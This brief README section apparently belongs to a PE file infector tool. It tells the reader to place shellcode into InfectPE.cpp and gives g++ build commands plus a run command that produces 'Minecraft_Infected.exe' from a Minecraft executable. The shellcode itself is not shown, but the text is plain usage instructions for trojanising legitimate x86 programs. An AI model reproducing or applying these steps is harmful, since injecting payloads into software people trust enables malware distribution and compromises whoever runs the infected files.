### Infect a file
Put the shellcode inside the infectPE.cpp (only accepts x86 executables).

```sh
> g++ -c PE.cpp -std=c++17
> g++ -c InfectPE.cpp -std=c++17
> g++ -o InfectPE.exe InfectPE.o PE.o
> ./InfectPE.exe ./Minecraft/Minecraft.exe ./Minecraft/Minecraft_Infected.exe
```